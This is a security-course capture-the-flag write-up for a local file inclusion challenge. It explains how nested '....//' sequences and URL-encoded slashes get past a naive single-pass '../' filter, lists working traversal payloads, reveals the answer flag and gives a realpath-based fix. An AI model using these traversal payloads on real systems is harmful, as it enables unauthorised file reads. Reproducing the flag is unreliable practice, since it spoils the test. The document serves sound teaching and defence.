# 08 — LFI: Traversal with Filter Bypass · Hard · 250 pts

**OWASP:** A01:2021 Broken Access Control / A05 Security Misconfiguration · **Course ref:** Lab4 LFI,
Ch07 Filter Evasion (nested sequences, URL encoding).

## Scenario / Briefing (shown to students in-app)
Same portal, now with a "fix": the developer strips `../` from your input. But they strip it only *once*, and they
forgot about encoding. Nested sequences that *become* `../` after stripping, or URL-encoded slashes, sail right past
(Ch7 evasion).
**Your objective:** defeat the naive filter and reach the flag file anyway.

## Walkthrough
1. `?file=../../secret/flag.txt` → *File not found: secret/flag.txt* — the error shows the filter removed `../`.
2. **Nesting:** `....//` minus the inner `../` leaves `../`:
   ```
   /download?file=....//....//secret/flag.txt
   ```
3. **Encoding:** the filter runs *before* URL-decoding, so it never sees `%2f`:
   ```
   /download?file=..%2f..%2fsecret%2fflag.txt
   ```
   (`%2e%2e/` works for the same reason.)

Flag: `FLAG{lfi_encoded_traversal_bypass}`

## The bug
`sanitize()` (`# ======= VULN HERE =======`): `raw.replace("../", "")` is a single pass that can create new `../`
sequences, and it runs on the raw value before `unquote_plus()` decodes it.

## The fix
Decode fully first, normalise, then **validate (reject), don't clean**:
```python
name = urllib.parse.unquote(raw)
real = os.path.realpath(os.path.join(BASE, name))
if not real.startswith(os.path.realpath(BASE) + os.sep):
    return 403
```
